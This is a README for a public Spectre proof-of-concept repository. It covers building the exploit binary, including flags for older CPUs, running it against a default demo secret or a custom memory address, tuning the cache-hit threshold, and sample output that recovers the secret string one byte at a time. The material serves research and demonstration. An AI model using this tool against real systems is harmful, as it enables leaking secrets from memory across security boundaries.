# SpectrePoC

Proof of concept code for the Spectre CPU exploit.

## Attribution

The source code originates from the example code provided in the "Spectre Attacks: Exploiting Speculative Execution" paper found here:

https://spectreattack.com/spectre.pdf

The original source code used in this repository was conveniently provided by Erik August's gist, found here: https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6

The code has been modified to fix build issues, add workaround for older CPUs, and improve comments where possible.

## Building

The project can be built with GNU Make and GCC.

On debian these are included in the `build-essential` metapackage.

Building is as easy as:

`cd SpectrePoC`

`make`

The output binary is `./spectre.out`.

### Building for older CPUs

Depending on the CPU, certain instructions will need to be disabled in order for the program to run correctly.

The instructions in question are:

#### rdtscp:

Introduced with x86-64.
All 32-bit only CPUs, including many Core 2 Duos, will need to disable this instruction.

To build the project without `rdtscp`, define the NORDTSCP cflag:

`CFLAGS=-DNORDTSCP make` 

#### mfence:
Introduced with SSE2.
Most CPUs pre-Pentium 4 will need to disable this instruction.

To build the project without `mfence`, define the NOMFENCE cflag:

`CFLAGS=-DNOMFENCE make`

#### clflush
Introduced with SSE2.
Most CPUs pre-Pentium 4 will need to disable this instruction.

To build the project without `clflush`, define the NOCLFLUSH cflag:

`CFLAGS=-DNOCLFLUSH make`

To define multiple cflags, separate each cflag with an escaped space. For example:

`CFLAGS=-DNORDTSCP\ -DNOMFENCE\ -DNOCLFLUSH make`

### Building it without using the Makefile

If you want to build it manually, make sure to disable all optimisations (aka, don't use -O2), as it will break the program.

## Executing

To run spectre with default cache hit threshold of 80, and the secret example string "The Magic Words are Squeamish Ossifrage." as the target, run `./spectre.out` with no command line arguments.

**Example:** `./spectre.out`

The cache hit threshold can be specified as the first command line argument. It must be a whole positive integer.

**Example:** `./spectre.out 80`

A custom target address and length can be given as the second and third command line arguments, respectively.

**Example:** `./spectre.out 80 12345678 128`

## Tweaking

If you're getting lackluster results, you may need to tweak the cache hit threshold. This can be done by providing a threshold as the first command line argument.

While a value of 80 appears to work for most desktop CPUs, a larger value may be required for slower CPUs. For example, on a AMD GX-412TC SOC, a value of 100-300 was required to get a good result.

## Contributing

Feel free to add your results to the "Results" issue. Include your cache hit threshold, OS details, CPU details like vendor Id, family, model name, stepping, microcode, MHz, and cache size. The OS can be found by running `uname -a`. CPU info can be found by running `cat /proc/cpuinfo` on Linux, and `sysctl -a | grep machdep.cpu` on OSX.

## Example output

The following was output on an AMD GX-412TC SOC, with a cache hit threshold of 100:

`./spectre.out 100:`

```
Using a cache hit threshold of 100.
Build: RDTSCP_SUPPORTED CLFLUSH_SUPPORTED
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffdfedf8... Success: 0x54=’T’ score=2
Reading at malicious_x = 0xffffffffffdfedf9... Success: 0x68=’h’ score=2
Reading at malicious_x = 0xffffffffffdfedfa... Success: 0x65=’e’ score=2
Reading at malicious_x = 0xffffffffffdfedfb... Success: 0x20=’ ’ score=2
Reading at malicious_x = 0xffffffffffdfedfc... Success: 0x4D=’M’ score=2
Reading at malicious_x = 0xffffffffffdfedfd... Success: 0x61=’a’ score=2
Reading at malicious_x = 0xffffffffffdfedfe... Success: 0x67=’g’ score=2
Reading at malicious_x = 0xffffffffffdfedff... Success: 0x69=’i’ score=2
Reading at malicious_x = 0xffffffffffdfee00... Success: 0x63=’c’ score=2
Reading at malicious_x = 0xffffffffffdfee01... Success: 0x20=’ ’ score=2
Reading at malicious_x = 0xffffffffffdfee02... Success: 0x57=’W’ score=2
Reading at malicious_x = 0xffffffffffdfee03... Success: 0x6F=’o’ score=2
Reading at malicious_x = 0xffffffffffdfee04... Success: 0x72=’r’ score=2
Reading at malicious_x = 0xffffffffffdfee05... Success: 0x64=’d’ score=2
Reading at malicious_x = 0xffffffffffdfee06... Success: 0x73=’s’ score=2
Reading at malicious_x = 0xffffffffffdfee07... Success: 0x20=’ ’ score=2
Reading at malicious_x = 0xffffffffffdfee08... Success: 0x61=’a’ score=2
Reading at malicious_x = 0xffffffffffdfee09... Success: 0x72=’r’ score=2
Reading at malicious_x = 0xffffffffffdfee0a... Success: 0x65=’e’ score=2
Reading at malicious_x = 0xffffffffffdfee0b... Success: 0x20=’ ’ score=2
Reading at malicious_x = 0xffffffffffdfee0c... Success: 0x53=’S’ score=2
Reading at malicious_x = 0xffffffffffdfee0d... Success: 0x71=’q’ score=2
Reading at malicious_x = 0xffffffffffdfee0e... Success: 0x75=’u’ score=2
Reading at malicious_x = 0xffffffffffdfee0f... Success: 0x65=’e’ score=2
Reading at malicious_x = 0xffffffffffdfee10... Success: 0x61=’a’ score=2
Reading at malicious_x = 0xffffffffffdfee11... Success: 0x6D=’m’ score=2
Reading at malicious_x = 0xffffffffffdfee12... Success: 0x69=’i’ score=2
Reading at malicious_x = 0xffffffffffdfee13... Success: 0x73=’s’ score=2
Reading at malicious_x = 0xffffffffffdfee14... Success: 0x68=’h’ score=2
Reading at malicious_x = 0xffffffffffdfee15... Success: 0x20=’ ’ score=2
Reading at malicious_x = 0xffffffffffdfee16... Success: 0x4F=’O’ score=2
Reading at malicious_x = 0xffffffffffdfee17... Success: 0x73=’s’ score=2
Reading at malicious_x = 0xffffffffffdfee18... Success: 0x73=’s’ score=2
Reading at malicious_x = 0xffffffffffdfee19... Success: 0x69=’i’ score=2
Reading at malicious_x = 0xffffffffffdfee1a... Success: 0x66=’f’ score=2
Reading at malicious_x = 0xffffffffffdfee1b... Success: 0x72=’r’ score=2
Reading at malicious_x = 0xffffffffffdfee1c... Success: 0x61=’a’ score=2
Reading at malicious_x = 0xffffffffffdfee1d... Success: 0x67=’g’ score=2
Reading at malicious_x = 0xffffffffffdfee1e... Success: 0x65=’e’ score=2
Reading at malicious_x = 0xffffffffffdfee1f... Success: 0x2E=’.’ score=2
```
